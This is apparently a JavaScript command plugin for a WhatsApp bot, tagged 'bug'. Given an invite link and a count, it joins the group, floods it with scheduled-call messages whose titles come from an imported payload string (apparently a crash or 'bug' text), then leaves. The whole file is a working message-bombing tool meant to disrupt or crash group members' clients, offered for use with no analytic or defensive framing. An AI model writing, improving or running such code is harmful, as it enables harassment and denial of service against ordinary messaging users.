let moment = require('moment-timezone')
let time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
let salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { kemiibug } = require('../lib/kemiibug.js')
const { weg } = require('../lib/weg.js')

let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
let handler = async (m, { conn, text, command, usedPrefix }) => {
let [link, jumlah] = text.split `|`
if (!link) return conn.reply(m.chat, `Example: ${usedPrefix + command} https://chat.whatsapp.com/xxxxxx|20`, m)
if (!jumlah) return conn.reply(m.chat, `Example: ${usedPrefix + command} https://chat.whatsapp.com/xxxxxx|20`, m)
let [_, code] = link.match(linkRegex) || []
if (!code) return conn.reply(m.chat, `Example: ${usedPrefix + command} https://chat.whatsapp.com/xxxxxx`, m)
if (text == sgc) return m.reply('Tidak bisa spam ke group ini')
let kemii = await conn.groupAcceptInvite(code)
jumlah = `${jumlah}`
for (let i = 0; i < jumlah; i++) {
const cap = `${weg}`
let call = {
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: `${cap}`
}}
conn.relayMessage(kemii, call, {})
await sleep(1000)
}
await m.reply(`*Sukses mengirim Bug Sejumlah ${jumlah} Tolong Jeda 3 Menit Yah*`)
await conn.groupLeave(kemii)
}
handler.help = ['buggc2']
handler.tags = ['bug']
handler.premium = true
handler.command = /^(buggc2)$/i
handler.register = true
handler.limit = true

module.exports = handler
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}